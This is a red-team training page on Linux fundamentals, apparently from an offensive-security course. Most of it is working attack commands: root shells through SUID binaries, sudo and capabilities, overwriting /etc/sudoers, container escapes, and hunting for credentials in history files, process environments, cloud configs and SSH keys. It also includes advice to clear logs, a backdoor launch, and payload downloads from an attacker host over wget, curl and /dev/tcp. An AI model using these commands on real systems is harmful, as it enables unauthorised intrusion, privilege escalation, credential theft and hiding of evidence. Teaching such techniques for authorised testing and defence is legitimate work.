---
layout: training-page
title: "Linux Fundamentals — Red Team Academy"
module: "Fundamentals"
tags:
  - linux
  - cli
  - essentials
page_key: "fundamentals-linux-basics"
render_with_liquid: false
---

# Linux Fundamentals for Red Teamers

![Linux filesystem red team paths: /etc for passwd/shadow/sudoers, /home for SSH keys and bash history, /var/log for evidence, /tmp for payload staging, /proc for process info](/images/fundamentals/linux-fs-security.svg)  
*// linux filesystem — high-value paths for enumeration and exploitation*

## Filesystem Hierarchy

Understanding where things live on Linux is essential for both attacking and enumerating Linux targets.

| Path | Contents | Red Team Interest |
| --- | --- | --- |
| /etc | System config files | passwd, shadow, sudoers, crontab, SSH keys |
| /home | User home directories | .ssh/authorized_keys, .bash_history, credentials in scripts |
| /root | Root home directory | Root SSH keys, bash history, sensitive files |
| /var/log | System log files | Evidence of your activity — clear or tamper here |
| /tmp & /dev/shm | Temporary storage (world-writable) | Drop tools here — no-exec mounts may restrict this |
| /proc | Virtual FS — running processes | /proc/<pid>/mem for credential access, /proc/net for network info |
| /usr/bin, /usr/sbin | System binaries | SUID binaries, GTFOBins candidates |
| /opt | Optional/third-party software | Application configs, hardcoded credentials in apps |

## Essential Navigation & File Commands

```
# Navigate the filesystem
pwd                         # Print current directory
ls -la                      # List all files with permissions
ls -la /etc | grep -i pass  # Filter listing for interesting files
cd /var/log && ls -lt       # Change dir + sort by modification time

# File inspection
cat /etc/passwd             # View file contents
less /var/log/auth.log      # Scroll through large files (q to quit)
head -n 50 /var/log/syslog  # First 50 lines
tail -f /var/log/auth.log   # Watch file in real time
grep -r "password" /etc/ 2>/dev/null   # Recursive search for keyword
grep -rni "api_key\|secret\|password" /home/ 2>/dev/null  # Case-insensitive

# Find files
find / -name "*.conf" 2>/dev/null      # Find all config files
find / -perm -4000 2>/dev/null         # Find SUID binaries (privesc!)
find / -writable -type f 2>/dev/null   # Find writable files
find /home -name ".bash_history"       # Find all bash history files
find / -name "id_rsa" 2>/dev/null      # Hunt for SSH private keys
```

## File Permissions & SUID

Linux permissions are critical for privilege escalation. Every file has owner, group, and other permission bits.

```
# Permission format: -rwxrwxrwx (type + owner + group + other)
#   r = read (4), w = write (2), x = execute (1)
ls -la /etc/shadow
# -rw-r----- root shadow — only root and shadow group can read

# SUID bit (s in owner execute position) — runs as file owner
ls -la /usr/bin/passwd
# -rwsr-xr-x root root — runs as root regardless of who executes

# Find all SUID binaries (gold mine for privesc)
find / -perm -u=s -type f 2>/dev/null

# GTFOBins: if a SUID binary is in this list, you can get a root shell
# https://gtfobins.github.io/
# Example: SUID on /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit   # Spawns root shell
```

## Users, Groups & Sudo

```
# Enumerate users
cat /etc/passwd             # All user accounts (UID:GID:home:shell)
cat /etc/shadow             # Password hashes (requires root)
cat /etc/group              # Group memberships
id                          # Current user's UID, GID, groups
whoami                      # Current username

# Check sudo privileges — critical privesc vector
sudo -l                     # What can this user run as root?
# Example output:
# (ALL : ALL) NOPASSWD: /usr/bin/vim   ← can run vim as root without password!
# GTFOBins vim: sudo vim -c ':!/bin/sh'

# Check who's logged in
w                           # Who is logged in and what they're doing
last                        # Login history
lastlog                     # Last login for each user
```

## Process & Service Enumeration

```
# Running processes
ps aux                      # All processes with user and command
ps aux | grep root          # Only root processes
ps -ef --forest             # Process tree view

# Network connections
ss -tulnp                   # All listening ports with PIDs
netstat -tulnp              # Alternative (older systems)
ss -tp                      # Active connections with process names
cat /etc/hosts              # Local hostname resolution

# Services
systemctl list-units --type=service --state=running  # Active services
systemctl status sshd       # Check a specific service
crontab -l                  # Current user's cron jobs
cat /etc/crontab            # System-wide cron jobs
ls /etc/cron.*              # Cron job directories (daily, weekly, etc.)
```

## Shell Essentials — Piping, Redirection & Scripting

```
# Piping — chain commands together
cat /etc/passwd | cut -d: -f1           # Extract just usernames
ps aux | grep -v grep | grep apache     # Filter process list
find / -perm -4000 2>/dev/null | xargs ls -la  # List all SUID binaries

# Redirection
ls -la > /tmp/output.txt                # Write stdout to file
ls -la >> /tmp/output.txt               # Append stdout to file
command 2>/dev/null                     # Suppress errors
command 2>&1 | tee /tmp/log.txt         # Log both stdout and stderr

# Useful one-liners for red teamers
# Spawn a TTY shell (after getting a dumb shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash

# Background a process and disown it
nohup ./backdoor & disown

# Transfer files (when wget/curl are absent)
# On attacker:  python3 -m http.server 80
# On target:
wget http://10.10.10.10/tool -O /tmp/tool
curl http://10.10.10.10/tool -o /tmp/tool
# Or with bash:
bash -c 'cat < /dev/tcp/10.10.10.10/8888 > /tmp/tool'
```

## Shell Stabilization — Full TTY Upgrade

Raw netcat shells break tab completion, CTRL+C kills your listener, and commands like `su` and `vim` don't work. Upgrade immediately after landing a shell.

```
# Step 1 — Spawn a PTY inside the victim shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Or:
script /dev/null -c /bin/bash

# Step 2 — Background the shell with CTRL+Z
# (back on your attacker machine now)

# Step 3 — Fix your terminal to pass raw keystrokes:
stty raw -echo; fg

# Step 4 — Inside the shell, set terminal type and size:
export TERM=xterm-256color
stty rows 50 cols 200     # match your actual terminal dimensions
# Check your local terminal size: stty size (in a separate window)

# Result: full tab completion, CTRL+C works, arrow keys work, vim works
```

## Linux Capabilities

Capabilities split root's privileges into discrete units. A binary can have `cap_setuid` without being SUID. Many overlooked binaries grant root without appearing in SUID searches.

```
# Find binaries with capabilities:
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid+ep  → can change UID to 0 → instant root
# cap_net_raw+ep → can sniff traffic (tcpdump, nmap with raw sockets)
# cap_sys_ptrace → can trace any process → memory reading, credential access
# cap_dac_override → bypass file permission checks → read /etc/shadow

# Exploitation examples:

# python3 with cap_setuid:
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# perl with cap_setuid:
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

# node with cap_setuid:
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# openssl with cap_read_search (read arbitrary files):
openssl req -engine ./openssl_engine.so -x509 -new -out /tmp/cert.pem -in /etc/shadow 2>/dev/null

# tcpdump with cap_net_raw (sniff all traffic):
tcpdump -i any -w /tmp/capture.pcap
# Then: capture NTLM challenges, plaintext credentials on HTTP/FTP/LDAP
```

## Sudo Misconfigurations

`sudo -l` shows what you can run as root. Even restricted sudo entries are frequently exploitable via GTFOBins or argument injection.

```
# Always run this first:
sudo -l
# Common exploitable entries:

# NOPASSWD all — trivial:
(ALL) NOPASSWD: ALL
sudo /bin/bash

# Specific binary — check GTFOBins:
(root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

(root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/bash \; -quit

(root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

(root) NOPASSWD: /bin/cp
# Overwrite /etc/sudoers — add your user to ALL:
echo "$USER ALL=(ALL) NOPASSWD:ALL" > /tmp/sudoers
sudo cp /tmp/sudoers /etc/sudoers

# Wildcards in sudo — argument injection:
(root) NOPASSWD: /usr/bin/rsync /home/* /backup/*
# Inject --rsh flag: sudo rsync -e 'sh -c "sh 0<&2 1>&2"' . host:/
# Or use --rsync-path: sudo rsync --rsync-path='sudo sh -c "sh 0<&2 1>&2"' . host:/

# Environment variable abuse (if env_keep or SETENV):
(root) NOPASSWD: /usr/bin/env /path/to/script
sudo LD_PRELOAD=/tmp/evil.so /path/to/script   # if env_keep+=LD_PRELOAD allowed

# sudo -i via any shell escape:
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd    # then: !bash
sudo man ls              # then: !bash
```

## Credential Hunting — Config Files & Environment

Credentials are left in config files, scripts, environment variables, and shell history constantly. This is often the fastest path to privilege escalation or lateral movement.

```
# Shell history files — often contains passwords typed as arguments:
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.fish_history
find /home -name ".*_history" 2>/dev/null | xargs cat 2>/dev/null

# Environment variables — apps often store secrets here:
env
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|key\|token\|api"
# Check running process environments (requires root or same UID):
cat /proc/1234/environ 2>/dev/null | tr '\0' '\n'

# Config files with credentials:
grep -rni "password\|passwd\|secret\|api_key\|token\|credential" \
  /etc/ /opt/ /var/www/ /home/ 2>/dev/null \
  --include="*.conf" --include="*.cfg" --include="*.ini" \
  --include="*.yaml" --include="*.yml" --include="*.json" \
  --include="*.php" --include="*.py" --include="*.rb" \
  --include="*.env" --include="*.sh"

# Database credentials:
find / -name "wp-config.php" 2>/dev/null    # WordPress
find / -name "database.yml" 2>/dev/null     # Rails
find / -name ".env" 2>/dev/null             # Dotenv files
find / -name "settings.py" 2>/dev/null | xargs grep -l "PASSWORD" 2>/dev/null

# SSH keys — pivot to other systems:
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
find /home /root -name "authorized_keys" 2>/dev/null
# Readable private key → ssh to any server it's authorized on

# Cloud credentials:
cat ~/.aws/credentials
cat ~/.aws/config
find / -name "credentials" -path "*/.aws/*" 2>/dev/null
find / -name "*.json" -path "*/gcloud/*" 2>/dev/null  # GCP service accounts
```

## Container & Docker Escape Detection

When you land a shell, check if you're inside a container. Container escapes often lead directly to the host OS or other containers.

```
# Am I in a container?
ls -la /.dockerenv 2>/dev/null           # Docker — file present if containerized
cat /proc/1/cgroup | grep -i "docker\|lxc\|containerd"
cat /proc/self/cgroup | grep -c "/"      # Deep nesting = container
systemd-detect-virt 2>/dev/null          # Prints: docker, lxc, none, etc.

# Check capabilities inside container:
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff → nearly all caps = privileged container!
capsh --decode=0000003fffffffff          # Decode hex to cap names

# Privileged container escape (--privileged flag):
# Mount the host filesystem via a raw device:
fdisk -l                                  # Find host disk (e.g., /dev/sda)
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host                         # Full host root shell

# Cap_sys_admin escape (can mount):
mkdir /tmp/exploit
mount -t cgroup -o rdma cgroup /tmp/exploit 2>/dev/null || \
  mount -t cgroup2 none /tmp/exploit
# Release_agent abuse: echo '#!/bin/sh\ncp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /exploit.sh

# Docker socket escape (if /var/run/docker.sock is accessible):
ls -la /var/run/docker.sock
# If present: run a new privileged container mounting host root:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Writable host path mounted into container:
mount | grep "type ext4\|type xfs"       # Look for host filesystem mounts
# If /etc or /root is bind-mounted → write SSH keys or modify sudoers directly
```

## Common Privesc Checks (Quick Reference)

```
# Run in order — stop when you find a path:

# 1. Automated enumeration (start here):
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/lpe.txt

# 2. Sudo rights — most common path:
sudo -l

# 3. SUID/SGID binaries:
find / -perm /6000 -type f 2>/dev/null | xargs ls -la

# 4. Capabilities:
getcap -r / 2>/dev/null

# 5. Writable cron jobs:
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
# Look for scripts writable by you: find / -path "*/cron*" -writable 2>/dev/null

# 6. /etc/passwd writable:
ls -la /etc/passwd
# If writable: openssl passwd -1 -salt salt pass → add root user

# 7. Kernel version:
uname -r    # Check against https://github.com/bwbwbwbw/linux-exploit-suggester

# 8. Credentials in config/history:
cat ~/.bash_history; grep -rni "password" /home/ 2>/dev/null

# 9. NFS with no_root_squash:
cat /etc/exports    # If no_root_squash present → mount from attacker as root

# 10. Writable /etc/sudoers or sudoers.d:
ls -la /etc/sudoers /etc/sudoers.d/ 2>/dev/null
```

## Useful Resources

- `https://gtfobins.github.io` — GTFOBins: SUID/sudo/capabilities abuse
- `https://github.com/peass-ng/PEASS-ng` — LinPEAS automated enumeration
- `https://book.hacktricks.xyz/linux-hardening/privilege-escalation` — HackTricks Linux privesc
- `https://explainshell.com` — Explain any shell command
